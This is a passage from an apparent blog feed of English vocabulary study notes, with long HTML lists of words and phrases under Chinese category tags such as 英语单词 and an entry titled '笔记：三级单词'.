<li>automatic</li><li>ware</li><li>spokesman</li><li>versus</li><li>distract</li><li>clash</li><li>glance</li><li>deficient</li><li>seal</li><li>earnest</li><li>geology</li><li>grind</li><li>anticipate</li><li>quantify</li><li>spherical</li><li>pursue</li><li>competitive</li></ol><hr><ol start="1525"><li>coil</li><li>inland</li><li>enormous</li><li>bug</li><li>brutal</li><li>counsel</li><li>battery</li><li>viewpoint</li><li>bloody</li><li>idle</li><li>concentration</li><li>philosopher</li><li>vehicle</li><li>exceedingly</li><li>palm</li><li>likewise</li><li>haul</li><li>liver</li><li>gulf</li><li>hedge</li><li>crystal</li><li>courageous</li><li>junior</li><li>horsepower</li><li>contradiction</li><li>overlook</li><li>verify</li><li>operator</li><li>threaten</li><li>blast</li><li>identical</li><li>calculation</li><li>consequence</li><li>frustrate</li><li>satisfaction</li><li>decorative</li><li>distribution</li><li>regularity</li><li>sole</li><li>colony</li><li>invasion</li><li>combination</li><li>economical</li><li>assurance</li><li>controversy</li><li>completion</li><li>legend</li><li>breadth</li><li>departure</li><li>so-called</li><li>clarify</li><li>criminal</li><li>assess</li><li>naked</li><li>worship</li><li>ease</li><li>contract</li><li>bulletin</li><li>wasteful</li><li>coach</li><li>senate</li><li>pose</li><li>interrupt</li><li>cabinet</li><li>beneath</li><li>environmental</li><li>repetition</li><li>cease</li><li>luncheon</li><li>implication</li><li>inclination</li><li>comprehend</li><li>chill</li><li>moral</li><li>expose</li><li>furnish</li><li>polar</li><li>ax</li><li>ditch</li><li>despair</li><li>diplomatic</li><li>poison</li><li>severe</li><li>infer</li><li>exclusive</li><li>solemn</li><li>fleet</li><li>spatial</li><li>soda</li><li>stretch</li><li>extensive</li><li>ignorance</li><li>plural</li><li>distinguish</li><li>payment</li><li>automate</li><li>dictator</li><li>cling</li><li>enlarge</li><li>recognition</li><li>independence</li><li>tragic</li><li>section</li><li>witty</li><li>insert</li><li>housing</li><li>scratch</li><li>muscular</li><li>injure</li><li>explosion</li><li>photography</li><li>realization</li><li>circuit</li><li>compensate</li><li>disturbance</li><li>complex</li><li>manipulate</li><li>assembly</li><li>particle</li><li>criticism</li><li>version</li><li>twist</li><li>marginal</li><li>receiver</li><li>estate</li><li>mammal</li><li>boast</li><li>board</li><li>criticize</li><li>genius</li><li>observation</li><li>oval</li><li>successor</li><li>sincerity</li><li>magnet</li><li>sideways</li><li>rug</li><li>reputation</li><li>ignorant</li><li>volunteer</li><li>approximate</li><li>allowance</li><li>majority</li><li>nevertheless</li><li>pigeon</li><li>moist</li><li>prime</li><li>elsewhere</li><li>hazard</li><li>contribute</li><li>announce</li><li>torch</li><li>liquor</li><li>widen</li><li>storage</li><li>graceful</li><li>accommodate</li><li>qualify</li><li>colonial</li><li>racial</li><li>episode</li><li>exposure</li><li>competition</li><li>incline</li><li>attendant</li><li>shrimp</li><li>occupy</li><li>indication</li><li>outbreak</li><li>bolt</li><li>enthusiastic</li><li>dean</li><li>haunt</li><li>aggressive</li><li>signal</li><li>interview</li><li>external</li><li>conform</li><li>mold</li><li>deprive</li><li>intention</li><li>construct</li></ol>]]></content>
    
    
    <categories>
      
      <category>英语</category>
      
      <category>英语单词</category>
      
      <category>一级单词</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：三级单词</title>
    <link href="/2025/05/15/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%B8%89%E7%BA%A7%E5%8D%95%E8%AF%8D/"/>
    <url>/2025/05/15/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%B8%89%E7%BA%A7%E5%8D%95%E8%AF%8D/</url>
    
    <content type="html"><![CDATA[<ol><li><p>imperialism</p></li><li><p>revelation</p></li><li><p>peril</p></li><li><p>cabin</p></li><li><p>municipal</p></li><li><p>speculate</p></li><li><p>coarse</p></li><li><p>incidence</p></li><li><p>lease</p></li><li><p>patch</p></li><li><p>utility</p></li><li><p>copper</p></li><li><p>convention</p></li><li><p>disguise</p></li><li><p>flourish</p></li><li><p>reckon</p></li><li><p>crush</p></li><li><p>breakdown</p></li><li><p>liable</p></li><li><p>delegate</p></li><li><p>overwhelming</p></li><li><p>superiority</p></li><li><p>compatible</p></li><li><p>pad</p></li><li><p>detection</p></li><li><p>pillar</p></li><li><p>cement</p></li><li><p>tragedy</p></li><li><p>thrive</p></li><li><p>dictate</p></li><li><p>drip</p></li><li><p>compel</p></li><li><p>jury</p></li><li><p>vague</p></li><li><p>lavatory</p></li><li><p>arise</p></li><li><p>evil</p></li><li><p>carrier</p></li><li><p>eliminate</p></li><li><p>conquest</p></li><li><p>pierce</p></li><li><p>gear</p></li><li><p>modification</p></li><li><p>admission</p></li><li><p>donation</p></li><li><p>lean</p></li><li><p>continental</p></li><li><p>microscopic</p></li><li><p>motorway</p></li><li><p>pitch</p></li><li><p>motion</p></li><li><p>veil</p></li><li><p>millimetre</p></li><li><p>stock</p></li><li><p>gross</p></li><li><p>revolutionary</p></li><li><p>simplicity</p></li><li><p>preface</p></li><li><p>intensity</p></li><li><p>definite</p></li><li><p>depress</p></li><li><p>distinction</p></li><li><p>astonishment</p></li><li><p>pray</p></li><li><p>retreat</p></li><li><p>magnificent</p></li><li><p>elevation</p></li><li><p>locality</p></li><li><p>transaction</p></li><li><p>corporation</p></li><li><p>accent</p></li><li><p>receipt</p></li><li><p>refine</p></li><li><p>mess</p></li><li><p>barely</p></li><li><p>fright</p></li><li><p>namely</p></li><li><p>undergraduate</p></li><li><p>sensible</p></li><li><p>vacuum</p></li><li><p>onward</p></li><li><p>observe</p></li><li><p>rival</p></li><li><p>mutual</p></li><li><p>regulate</p></li><li><p>exert</p></li><li><p>resemble</p></li><li><p>industrial</p></li><li><p>hindrance</p></li><li><p>embarrass</p></li><li><p>squeeze</p></li><li><p>administration</p></li><li><p>dimension</p></li><li><p>inspect</p></li><li><p>assumption</p></li><li><p>imply</p></li><li><p>devise</p></li><li><p>neglect</p></li><li><p>pessimistic</p></li><li><p>clip</p></li><li><p>aerial</p></li><li><p>surplus</p></li><li><p>inflation</p></li><li><p>polish</p></li><li><p>alternative</p></li><li><p>mathematical</p></li><li><p>dirt</p></li><li><p>hospitality</p></li><li><p>radar</p></li><li><p>senator</p></li><li><p>circumstance</p></li><li><p>soak</p></li><li><p>victim</p></li><li><p>dramatic</p></li><li><p>parallel</p></li><li><p>thermometer</p></li><li><p>lodge</p></li><li><p>capable</p></li><li><p>descend</p></li><li><p>sway</p></li><li><p>steer</p></li><li><p>gum</p></li><li><p>suspicious</p></li><li><p>whatsoever</p></li><li><p>validity</p></li><li><p>scope</p></li><li><p>uneasy</p></li><li><p>stuffy</p></li><li><p>summit</p></li><li><p>unemployment</p></li><li><p>heir</p></li><li><p>poverty</p></li><li><p>successive</p></li><li><p>stake</p></li><li><p>forthcoming</p></li><li><p>panic</p></li><li><p>executive</p></li><li><p>dispose</p></li><li><p>innocent</p></li><li><p>fluctuate</p></li><li><p>investigate</p></li><li><p>correspond</p></li><li><p>stale</p></li><li><p>wrack</p></li><li><p>crack</p></li><li><p>plunge</p></li><li><p>revenue</p></li><li><p>penetrate</p></li><li><p>candidate</p></li><li><p>conference</p></li><li><p>dump</p></li><li><p>correspondent</p></li><li><p>wreck</p></li><li><p>sector</p></li><li><p>marvelous</p></li><li><p>treaty</p></li><li><p>cruise</p></li><li><p>advocate</p></li><li><p>bible</p></li><li><p>merit</p></li><li><p>cereal</p></li><li><p>fuss</p></li><li><p>venture</p></li><li><p>sphere</p></li><li><p>appoint</p></li><li><p>cherish</p></li><li><p>republican</p></li><li><p>fierce</p></li><li><p>elevator</p></li><li><p>heap</p></li><li><p>prejudice</p></li><li><p>refreshment</p></li><li><p>peculiar</p></li><li><p>metric</p></li><li><p>congress</p></li><li><p>maiden</p></li><li><p>bait</p></li><li><p>scandal</p></li><li><p>nightmare</p></li><li><p>curse</p></li><li><p>density</p></li><li><p>hay</p></li><li><p>devil</p></li><li><p>temple</p></li><li><p>bore</p></li><li><p>bucket</p></li><li><p>spoil</p></li><li><p>originate</p></li><li><p>mathematics</p></li><li><p>elbow</p></li><li><p>regulation</p></li><li><p>gamble</p></li><li><p>multiplication</p></li><li><p>adoption</p></li><li><p>confront</p></li><li><p>dissolve</p></li><li><p>monument</p></li><li><p>publicity</p></li><li><p>ornament</p></li><li><p>trigger</p></li><li><p>inevitable</p></li><li><p>finance</p></li><li><p>imitation</p></li><li><p>subtract</p></li><li><p>fatigue</p></li><li><p>membership</p></li><li><p>destruction</p></li><li><p>pole</p></li><li><p>embassy</p></li><li><p>plane</p></li><li><p>decay</p></li><li><p>dismiss</p></li><li><p>degraded</p></li><li><p>Christian</p></li><li><p>toss</p></li><li><p>climate</p></li><li><p>axis</p></li><li><p>crash</p></li><li><p>perserve</p></li><li><p>retirement</p></li><li><p>predict</p></li><li><p>recession</p></li><li><p>vertical</p></li><li><p>quarterly</p></li><li><p>surgery</p></li><li><p>volt</p></li><li><p>batch</p></li><li><p>outset</p></li><li><p>curriculum</p></li><li><p>phase</p></li><li><p>forge</p></li><li><p>famine</p></li><li><p>stride</p></li><li><p>verbal</p></li><li><p>eternal</p></li><li><p>hostile</p></li><li><p>lest</p></li><li><p>compact</p></li><li><p>preliminary</p></li><li><p>consequently</p></li><li><p>rare</p></li><li><p>consent</p></li><li><p>nuisance</p></li><li><p>overtake</p></li><li><p>subsequent</p></li><li><p>promotion</p></li><li><p>utilize</p></li><li><p>stationary</p></li><li><p>bold</p></li><li><p>reform</p></li><li><p>grassy</p></li><li><p>architecture</p></li><li><p>perception</p></li><li><p>objection</p></li><li><p>architect</p></li><li><p>tray</p></li><li><p>spite</p></li><li><p>nerve</p></li><li><p>restrain</p></li><li><p>smash</p></li><li><p>insurance</p></li><li><p>grand</p></li><li><p>era</p></li><li><p>integrate</p></li><li><p>cancer</p></li><li><p>fence</p></li><li><p>stem</p></li><li><p>bearing</p></li><li><p>dialect</p></li><li><p>circular</p></li><li><p>pound</p></li><li><p>resign</p></li><li><p>indispensable</p></li><li><p>exhaust</p></li><li><p>classification</p></li><li><p>pregnant</p></li><li><p>process</p></li><li><p>strap</p></li><li><p>diameter</p></li><li><p>altitude</p></li><li><p>composer</p></li><li><p>punch</p></li><li><p>identification</p></li><li><p>shiver</p></li><li><p>parade</p></li><li><p>present</p></li><li><p>halt</p></li><li><p>abundance</p></li><li><p>vapour</p></li><li><p>prominent</p></li><li><p>reaction</p></li><li><p>automobile</p></li><li><p>suburb</p></li><li><p>universal</p></li><li><p>sincere</p></li><li><p>proficient</p></li><li><p>literal</p></li><li><p>proportion</p></li><li><p>politics</p></li><li><p>prison</p></li><li><p>stage</p></li><li><p>engage</p></li><li><p>involve</p></li><li><p>grip</p></li><li><p>customary</p></li><li><p>district</p></li><li><p>flock</p></li><li><p>lamp</p></li><li><p>plentiful</p></li><li><p>Marxist</p></li><li><p>spouse</p></li><li><p>essence</p></li><li><p>reception</p></li><li><p>terminal</p></li><li><p>simulated</p></li><li><p>triumph</p></li><li><p>therapeutical</p></li><li><p>faithful</p></li><li><p>electronics</p></li><li><p>breed</p></li><li><p>upright</p></li><li><p>technique</p></li><li><p>companion</p></li><li><p>exclusion</p></li><li><p>obedience</p></li><li><p>timber</p></li><li><p>dumb</p></li><li><p>grain</p></li><li><p>crew</p></li><li><p>perspective</p></li><li><p>surgeon</p></li><li><p>indifferent</p></li><li><p>accomplish</p></li><li><p>tide</p></li><li><p>scheme</p></li><li><p>disgust</p></li><li><p>peak</p></li><li><p>siege</p></li><li><p>instinct</p></li><li><p>applicable</p></li><li><p>trial</p></li><li><p>infect</p></li><li><p>balcony</p></li><li><p>mist</p></li><li><p>reference</p></li><li><p>season</p></li><li><p>interference</p></li><li><p>approve</p></li><li><p>voltage</p></li><li><p>reproduction</p></li><li><p>pretend</p></li><li><p>boundary</p></li><li><p>barrel</p></li><li><p>hail</p></li><li><p>prospective</p></li><li><p>burden</p></li><li><p>banner</p></li><li><p>splash</p></li><li><p>curtain</p></li><li><p>bachelor</p></li><li><p>depart</p></li><li><p>shallow</p></li><li><p>council</p></li><li><p>crawl</p></li><li><p>damp</p></li><li><p>hollow</p></li><li><p>liability</p></li><li><p>sauce</p></li><li><p>rod</p></li><li><p>suspect</p></li><li><p>materialize</p></li><li><p>rhythm</p></li><li><p>template</p></li><li><p>mild</p></li><li><p>badge</p></li><li><p>apartment</p></li><li><p>resent</p></li><li><p>primitive</p></li><li><p>comparison</p></li><li><p>crisis</p></li><li><p>underestimate</p></li><li><p>conscious</p></li><li><p>counter</p></li><li><p>nursery</p></li><li><p>vanish</p></li><li><p>pour</p></li><li><p>beverage</p></li><li><p>revolve</p></li><li><p>proverb</p></li><li><p>induce</p></li><li><p>haste</p></li><li><p>forth</p></li><li><p>dye</p></li><li><p>attendance</p></li><li><p>consumption</p></li><li><p>undertaking</p></li><li><p>philosophy</p></li><li><p>commit</p></li><li><p>mill</p></li><li><p>confirmation</p></li><li><p>annual</p></li><li><p>drain</p></li><li><p>attorney</p></li><li><p>contend</p></li><li><p>experimental</p></li><li><p>patent</p></li><li><p>offensive</p></li><li><p>pinch</p></li><li><p>fantastic</p></li><li><p>cool</p></li><li><p>shortage</p></li><li><p>optimism</p></li><li><p>trap</p></li><li><p>substitute</p></li><li><p>occupant</p></li><li><p>admiration</p></li><li><p>pledge</p></li><li><p>rage</p></li><li><p>canal</p></li><li><p>impress</p></li><li><p>conservative</p></li><li><p>infinity</p></li><li><p>specific</p></li><li><p>recover</p></li><li><p>reap</p></li><li><p>rely</p></li><li><p>cosmic</p></li><li><p>apt</p></li><li><p>narration</p></li><li><p>commitment</p></li><li><p>metallic</p></li><li><p>tunnel</p></li><li><p>division</p></li><li><p>grief</p></li><li><p>rack</p></li><li><p>confess</p></li><li><p>reflect</p></li><li><p>situate</p></li><li><p>derivation</p></li><li><p>heading</p></li><li><p>fortune</p></li><li><p>marital</p></li><li><p>triangular</p></li><li><p>maintenance</p></li><li><p>harmonious</p></li><li><p>irony</p></li><li><p>spark</p></li><li><p>reluctant</p></li><li><p>odd</p></li><li><p>personnel</p></li><li><p>advantageous</p></li><li><p>transmission</p></li><li><p>previal</p></li><li><p>interpret</p></li><li><p>responsible</p></li><li><p>contrary</p></li><li><p>presentation</p></li><li><p>chemistry</p></li><li><p>compound</p></li><li><p>desperate</p></li><li><p>treatment</p></li><li><p>resolute</p></li><li><p>noticeable</p></li><li><p>positive</p></li><li><p>purify</p></li><li><p>motel</p></li><li><p>valid</p></li><li><p>paste</p></li><li><p>rib</p></li><li><p>cashier</p></li><li><p>ethnic</p></li><li><p>specimen</p></li><li><p>energetic</p></li><li><p>notable</p></li><li><p>obligation</p></li><li><p>accumulation</p></li><li><p>deficiency</p></li><li><p>committee</p></li><li><p>moisture</p></li><li><p>fellowship</p></li><li><p>extinguish</p></li><li><p>reverse</p></li><li><p>doctoral</p></li><li><p>outlet</p></li><li><p>instrument</p></li><li><p>prevalent</p></li><li><p>pub</p></li><li><p>artistic</p></li><li><p>antique</p></li><li><p>forbid</p></li><li><p>assemble</p></li><li><p>interact</p></li><li><p>conceal</p></li><li><p>appeal</p></li><li><p>strip</p></li><li><p>hip</p></li><li><p>feedback</p></li><li><p>relative</p></li><li><p>suffer</p></li><li><p>leisure</p></li><li><p>discharge</p></li><li><p>emission</p></li><li><p>misfortune</p></li><li><p>endurance</p></li><li><p>consume</p></li><li><p>justice</p></li><li><p>obedient</p></li><li><p>democratic</p></li><li><p>settlement</p></li><li><p>toxic</p></li><li><p>pause</p></li><li><p>jealousy</p></li><li><p>governor</p></li><li><p>rescue</p></li><li><p>attribute</p></li><li><p>approach</p></li><li><p>parliament</p></li><li><p>college</p></li><li><p>sip</p></li><li><p>offend</p></li><li><p>worthless</p></li><li><p>accident</p></li><li><p>perceive</p></li><li><p>deliberate</p></li><li><p>morality</p></li><li><p>sorrowful</p></li><li><p>guilty</p></li><li><p>giant</p></li><li><p>spontaneous</p></li><li><p>retailer</p></li><li><p>bulb</p></li><li><p>arouse</p></li><li><p>journal</p></li><li><p>roller</p></li><li><p>surge</p></li><li><p>dose</p></li><li><p>miracle</p></li><li><p>charter</p></li><li><p>damn</p></li><li><p>entertain</p></li><li><p>apparatus</p></li><li><p>datum</p></li><li><p>sample</p></li><li><p>virtue</p></li><li><p>troop</p></li><li><p>frustration</p></li><li><p>funeral</p></li><li><p>peasant</p></li><li><p>evaluate</p></li><li><p>doom</p></li><li><p>expiation</p></li><li><p>confine</p></li><li><p>sensitive</p></li><li><p>academic</p></li><li><p>plague</p></li><li><p>crown</p></li><li><p>exile</p></li><li><p>poll</p></li><li><p>provided</p></li><li><p>flame</p></li><li><p>reduction</p></li><li><p>petty</p></li><li><p>counterpart</p></li><li><p>instantaneous</p></li><li><p>harsh</p></li><li><p>aware</p></li><li><p>bubble</p></li><li><p>realm</p></li><li><p>wagon</p></li><li><p>sophisticated</p></li><li><p>reunion</p></li><li><p>chip</p></li><li><p>stir</p></li><li><p>supper</p></li><li><p>impact</p></li><li><p>incentive</p></li><li><p>implement</p></li><li><p>discipline</p></li><li><p>procedure</p></li><li><p>atmosphere</p></li><li><p>military</p></li><li><p>content</p></li><li><p>suit</p></li><li><p>dialogue</p></li><li><p>faculty</p></li><li><p>glow</p></li><li><p>segment</p></li><li><p>exception</p></li><li><p>cable</p></li><li><p>corridor</p></li><li><p>pratical</p></li><li><p>permission</p></li><li><p>frank</p></li><li><p>conclusion</p></li><li><p>jungle</p></li><li><p>deem</p></li><li><p>stiff</p></li><li><p>veteran</p></li><li><p>certification</p></li><li><p>puzzle</p></li><li><p>bacteria</p></li><li><p>torture</p></li><li><p>integrity</p></li><li><p>delicate</p></li><li><p>cruelty</p></li><li><p>luxury</p></li><li><p>drainage</p></li><li><p>supervise</p></li><li><p>intense</p></li><li><p>strive</p></li><li><p>inference</p></li><li><p>collapse</p></li><li><p>superficial</p></li><li><p>persist</p></li><li><p>contrast</p></li><li><p>coherent</p></li><li><p>persuasion</p></li><li><p>fragment</p></li><li><p>precision</p></li><li><p>occupation</p></li><li><p>echo</p></li><li><p>miserable</p></li><li><p>momentary</p></li><li><p>recreation</p></li><li><p>commonplace</p></li><li><p>frequency</p></li><li><p>napkin</p></li><li><p>occurrence</p></li><li><p>reveal</p></li><li><p>generalize</p></li><li><p>aisle</p></li><li><p>projector</p></li><li><p>proceed</p></li><li><p>spacecraft</p></li><li><p>access</p></li><li><p>remark</p></li><li><p>decent</p></li><li><p>inward</p></li><li><p>prediction</p></li><li><p>monstrous</p></li><li><p>insult</p></li><li><p>organic</p></li><li><p>generator</p></li><li><p>precaution</p></li><li><p>linear</p></li><li><p>liter</p></li><li><p>folk</p></li><li><p>mortgage</p></li><li><p>condense</p></li><li><p>acute</p></li><li><p>swell</p></li><li><p>inform</p></li><li><p>sustain</p></li><li><p>notify</p></li><li><p>stripe</p></li><li><p>toll</p></li><li><p>pace</p></li><li><p>freight</p></li><li><p>solar</p></li><li><p>precious</p></li><li><p>suspicion</p></li><li><p>specialist</p></li><li><p>proposition</p></li><li><p>soften</p></li><li><p>passive</p></li><li><p>rifle</p></li><li><p>approval</p></li><li><p>wit</p></li><li><p>radical</p></li><li><p>sketch</p></li><li><p>comprehension</p></li><li><p>formulation</p></li><li><p>startle</p></li><li><p>assure</p></li><li><p>definition</p></li><li><p>hearty</p></li><li><p>continuity</p></li><li><p>tremendous</p></li><li><p>gang</p></li><li><p>complaint</p></li><li><p>sociology</p></li><li><p>ownership</p></li><li><p>mechanism</p></li><li><p>alliance</p></li><li><p>dorm</p></li><li><p>trash</p></li><li><p>spherical</p></li><li><p>quantify</p></li><li><p>anticipate</p></li><li><p>geology</p></li><li><p>earnest</p></li><li><p>seal</p></li><li><p>deficient</p></li><li><p>clash</p></li><li><p>distract</p></li><li><p>versus</p></li><li><p>ware</p></li><li><p>encounter</p></li><li><p>sacrifice</p></li><li><p>progressive</p></li><li><p>sack</p></li><li><p>spot</p></li><li><p>gravity</p></li><li><p>dispute</p></li><li><p>slope</p></li><li><p>ore</p></li><li><p>orbit</p></li><li><p>association</p></li><li><p>elevate</p></li><li><p>advisable</p></li><li><p>soar</p></li><li><p>practicable</p></li><li><p>gymnasium</p></li><li><p>monetary</p></li><li><p>romance</p></li><li><p>spacious</p></li><li><p>goodness</p></li><li><p>recruit</p></li><li><p>contest</p></li><li><p>deserve</p></li><li><p>proper</p></li><li><p>herd</p></li><li><p>straighten</p></li><li><p>skeleton</p></li><li><p>quest</p></li><li><p>attain</p></li><li><p>workout</p></li><li><p>clinical</p></li><li><p>interviewed</p></li><li><p>respondents</p></li><li><p>resisting</p></li><li><p>coil</p></li><li><p>inland</p></li><li><p>enormous</p></li><li><p>bug</p></li><li><p>brutal</p></li><li><p>counsel</p></li><li><p>battery</p></li><li><p>viewpoint</p></li><li><p>idle</p></li><li><p>concentration</p></li><li><p>philosopher</p></li><li><p>palm</p></li><li><p>haul</p></li><li><p>liver</p></li><li><p>gulf</p></li><li><p>hedge</p></li><li><p>junior</p></li><li><p>horsepower</p></li><li><p>contradiction</p></li><li><p>overlook</p></li><li><p>blast</p></li><li><p>identical</p></li><li><p>calculation</p></li><li><p>consequence</p></li><li><p>frustrate</p></li><li><p>colony</p></li><li><p>invasion</p></li><li><p>combination</p></li><li><p>economical</p></li><li><p>assurance</p></li><li><p>controversy</p></li><li><p>completion</p></li><li><p>legend</p></li><li><p>so-called</p></li><li><p>clarify</p></li><li><p>criminal</p></li><li><p>assess</p></li><li><p>derive</p></li><li><p>worship</p></li><li><p>ease</p></li><li><p>contract</p></li><li><p>bulletin</p></li><li><p>coach</p></li><li><p>interrupt</p></li><li><p>cabinet</p></li><li><p>repetition</p></li><li><p>cease</p></li><li><p>implication</p></li><li><p>comprehend</p></li><li><p>chill</p></li><li><p>moral</p></li><li><p>furnish</p></li><li><p>ax</p></li><li><p>ditch</p></li><li><p>diplomatic</p></li><li><p>poison</p></li><li><p>severe</p></li><li><p>infer</p></li><li><p>exclusive</p></li><li><p>solemn</p></li><li><p>fleet</p></li><li><p>spatial</p></li><li><p>stretch</p></li><li><p>extensive</p></li><li><p>ignorance</p></li><li><p>plural</p></li><li><p>automate</p></li><li><p>dictator</p></li><li><p>peculiarity</p></li><li><p>cling</p></li><li><p>recognition</p></li><li><p>independence</p></li><li><p>tragic</p></li><li><p>realization</p></li><li><p>circuit</p></li><li><p>compensate</p></li><li><p>disturbance</p></li><li><p>manipulate</p></li><li><p>assembly</p></li><li><p>particle</p></li><li><p>criticism</p></li><li><p>version</p></li><li><p>twist</p></li><li><p>marginal</p></li><li><p>receiver</p></li><li><p>estate</p></li><li><p>mammal</p></li><li><p>boast</p></li><li><p>board</p></li><li><p>criticize</p></li><li><p>genius</p></li><li><p>observation</p></li><li><p>oval</p></li><li><p>cultivate</p></li><li><p>sincerity</p></li><li><p>sideways</p></li><li><p>rug</p></li><li><p>reputation</p></li><li><p>ignorant</p></li><li><p>allowance</p></li><li><p>majority</p></li><li><p>pigeon</p></li><li><p>moist</p></li><li><p>hazard</p></li><li><p>contribute</p></li><li><p>announce</p></li><li><p>torch</p></li><li><p>liquor</p></li><li><p>accommodate</p></li><li><p>colonial</p></li><li><p>racial</p></li><li><p>episode</p></li><li><p>incline</p></li><li><p>attendant</p></li><li><p>occupy</p></li><li><p>indication</p></li><li><p>outbreak</p></li><li><p>enthusiastic</p></li><li><p>dean</p></li><li><p>grasp</p></li><li><p>haunt</p></li><li><p>aggressive</p></li><li><p>signal</p></li><li><p>external</p></li><li><p>conform</p></li><li><p>mold</p></li><li><p>deprive</p></li><li><p>sail</p></li><li><p>appears</p></li><li><p>consistent</p></li><li><p>strategies</p></li><li><p>dedicate</p></li><li><p>exploit</p></li><li><p>instruction</p></li><li><p>for</p></li><li><p>catch-up</p></li><li><p>interface</p></li><li><p>subject</p></li><li><p>realise</p></li><li><p>chores</p></li><li><p>indeed</p></li><li><p>reconsidered</p></li><li><p>realisation</p></li><li><p>pot</p></li><li><p>adapt</p></li><li><p>section</p></li><li><p>litre</p></li><li><p>fancy</p></li><li><p>harm</p></li><li><p>seperate</p></li><li><p>campaigners</p></li><li><p>nation</p></li><li><p>adviser</p></li><li><p>auto</p></li><li><p>strikingly</p></li><li><p>critical</p></li><li><p>visualize</p></li><li><p>you do not have to be…to…</p></li><li><p>speech</p></li><li><p>purpose</p></li><li><p>commonly</p></li><li><p>offenders</p></li><li><p>establish</p></li><li><p>masks</p></li><li><p>reparable</p></li><li><p>magnetic</p></li><li><p>burnout</p></li><li><p>reminded</p></li><li><p>explicity</p></li><li><p>craziness</p></li><li><p>remains</p></li><li><p>resultant</p></li><li><p>disservice</p></li><li><p>dearest</p></li><li><p>literacy</p></li><li><p>standard</p></li><li><p>compulsory</p></li><li><p>distress</p></li><li><p>extinct</p></li><li><p>stuff</p></li><li><p>cleverly</p></li><li><p>sucked</p></li><li><p>livelier</p></li><li><p>defies</p></li><li><p>fonder</p></li><li><p>bottle</p></li><li><p>shrimp</p></li><li><p>forehead</p></li><li><p>precise</p></li><li><p>deceive</p></li><li><p>beneath</p></li><li><p>assist</p></li><li><p>disconnects</p></li><li><p>folks</p></li><li><p>roughly</p></li><li><p>overstimated</p></li><li><p>rate</p></li><li><p>commence</p></li><li><p>liberal</p></li><li><p>mice</p></li><li><p>prescribes</p></li><li><p>neutral</p></li><li><p>revealed</p></li><li><p>readily</p></li><li><p>frequencies</p></li><li><p>distribution</p></li><li><p>blinding</p></li><li><p>validates</p></li><li><p>exhibited</p></li><li><p>latent</p></li><li><p>regained</p></li><li><p>neural</p></li><li><p>mobilizes</p></li><li><p>fixed</p></li><li><p>auditory</p></li><li><p>unified</p></li><li><p>plasticity</p></li><li><p>specialization</p></li><li><p>reversible</p></li><li><p>application</p></li><li><p>deteriorate</p></li><li><p>journey</p></li><li><p>performed</p></li><li><p>undermined</p></li><li><p>contained</p></li><li><p>accomplishments</p></li><li><p>desert</p></li><li><p>staying up late</p></li><li><p>be responsible for</p></li><li><p>take over</p></li><li><p>sentence by sentence</p></li><li><p>translates one when it encounters one</p></li><li><p>few…have been…as..。</p></li><li><p>the quest to</p></li><li><p>for years</p></li><li><p>be presented as</p></li><li><p>put in</p></li><li><p>and then</p></li><li><p>associate professor</p></li><li><p>it may not be</p></li><li><p>London-based firms</p></li><li><p>had a lot in common</p></li><li><p>reflect and question assumptions</p></li><li><p>in the name of</p></li><li><p>standing in their way to</p></li><li><p>take on</p></li><li><p>even though</p></li><li><p>split…into…</p></li><li><p>a fortune 500 company</p></li><li><p>be reminded to</p></li><li><p>committed to</p></li><li><p>over the next four years</p></li><li><p>like to</p></li><li><p>40% less… than…</p></li><li><p>it’s up to me</p></li><li><p>be understood to</p></li><li><p>gathering pace</p></li><li><p>the prevalence of</p></li><li><p>by</p></li><li><p>yet</p></li><li><p>as</p></li><li><p>pearls of</p></li><li><p>There are undoubtedly</p></li><li><p>out there</p></li><li><p>compare…to…</p></li><li><p>just the same</p></li><li><p>out on our own</p></li><li><p>be to blame for</p></li><li><p>for all</p></li><li><p>well over a pound</p></li><li><p>worth a record</p></li><li><p>imperialism</p></li><li><p>revelation</p></li><li><p>peril</p></li><li><p>cabin</p></li><li><p>municipal</p></li><li><p>speculate</p></li><li><p>coarse</p></li><li><p>incidence</p></li><li><p>lease</p></li><li><p>patch</p></li><li><p>utility</p></li><li><p>copper</p></li><li><p>convention</p></li><li><p>disguise</p></li><li><p>flourish</p></li><li><p>reckon</p></li><li><p>crush</p></li><li><p>breakdown</p></li><li><p>liable</p></li><li><p>delegate</p></li><li><p>overwhelming</p></li><li><p>superiority</p></li><li><p>compatible</p></li><li><p>pad</p></li><li><p>detection</p></li><li><p>pillar</p></li><li><p>cement</p></li><li><p>tragedy</p></li><li><p>thrive</p></li><li><p>dictate</p></li><li><p>drip</p></li><li><p>compel</p></li><li><p>jury</p></li><li><p>vague</p></li><li><p>lavatory</p></li><li><p>arise</p></li><li><p>evil</p></li><li><p>carrier</p></li><li><p>eliminate</p></li><li><p>conquest</p></li><li><p>pierce</p></li><li><p>gear</p></li><li><p>modification</p></li><li><p>admission</p></li><li><p>donation</p></li><li><p>lean</p></li><li><p>continental</p></li><li><p>microscopic</p></li><li><p>motorway</p></li><li><p>pitch</p></li><li><p>motion</p></li><li><p>veil</p></li><li><p>millimetre</p></li><li><p>stock</p></li><li><p>gross</p></li><li><p>revolutionary</p></li><li><p>simplicity</p></li><li><p>preface</p></li><li><p>intensity</p></li><li><p>definite</p></li><li><p>depress</p></li><li><p>distinction</p></li><li><p>astonishment</p></li><li><p>pray</p></li><li><p>retreat</p></li><li><p>magnificent</p></li><li><p>elevation</p></li><li><p>locality</p></li><li><p>transaction</p></li><li><p>corporation</p></li><li><p>accent</p></li><li><p>receipt</p></li><li><p>refine</p></li><li><p>mess</p></li><li><p>barely</p></li><li><p>fright</p></li><li><p>namely</p></li><li><p>undergraduate</p></li><li><p>sensible</p></li><li><p>vacuum</p></li><li><p>onward</p></li><li><p>observe</p></li><li><p>rival</p></li><li><p>mutual</p></li><li><p>regulate</p></li><li><p>exert</p></li><li><p>resemble</p></li><li><p>industrial</p></li><li><p>hindrance</p></li><li><p>embarrass</p></li><li><p>squeeze</p></li><li><p>administration</p></li><li><p>dimension</p></li><li><p>inspect</p></li><li><p>assumption</p></li><li><p>imply</p></li><li><p>devise</p></li><li><p>neglect</p></li><li><p>pessimistic</p></li><li><p>clip</p></li><li><p>aerial</p></li><li><p>surplus</p></li><li><p>inflation</p></li><li><p>polish</p></li><li><p>alternative</p></li><li><p>mathematical</p></li><li><p>dirt</p></li><li><p>hospitality</p></li><li><p>radar</p></li><li><p>senator</p></li><li><p>circumstance</p></li><li><p>soak</p></li><li><p>victim</p></li><li><p>dramatic</p></li><li>